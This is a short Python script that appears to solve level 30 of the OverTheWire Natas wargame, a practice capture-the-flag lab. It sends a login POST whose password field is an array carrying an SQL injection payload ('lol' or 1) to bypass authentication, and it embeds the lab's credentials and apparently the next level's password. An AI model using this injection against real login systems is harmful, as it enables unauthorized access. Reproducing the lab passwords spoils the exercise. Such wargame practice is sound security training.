import requests
session = requests.Session()

def natas30(url):
    #natas31:hay7aecuungiuKaezuathuk9biin0pu1
    
    params={"username": "natas31", "password": ["'lol' or 1",4]}
    response = session.post(url, data=params)
    print(response.text)
    # print(params)
    if 'fail' in response.text:
        print("FAILED")
    else:
        print("SUCCES")

if __name__ == '__main__':
    url = 'http://natas30:wie9iexae0Daihohv8vuu3cei9wahf0e@natas30.natas.labs.overthewire.org/'
    natas30(url)
